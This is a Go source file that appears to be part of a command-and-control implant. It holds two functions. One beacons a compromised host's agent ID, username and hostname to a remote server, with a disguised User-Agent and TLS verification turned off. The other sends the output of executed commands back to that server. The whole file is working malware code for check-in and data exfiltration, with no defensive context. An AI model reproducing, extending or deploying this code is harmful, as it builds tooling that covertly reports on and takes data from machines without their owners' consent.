package main

import (
	"crypto/tls"
	"io"
	"net/http"
	"strings"
)

func beaconHTTP(serverAddr, agentID, username, hostname string) (string, error) {
	url := "https://" + serverAddr + activeProfile.BeaconURL
	message := agentID + ":" + username + ":" + hostname
	req, err := http.NewRequest("POST", url, strings.NewReader(message))
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", activeProfile.UserAgent)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func sendResult(serverAddr, agentID, output string) error {
	url := "https://" + serverAddr + "/result"
	body := agentID + ":" + output
	req, err := http.NewRequest("POST", url, strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", activeProfile.UserAgent)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}
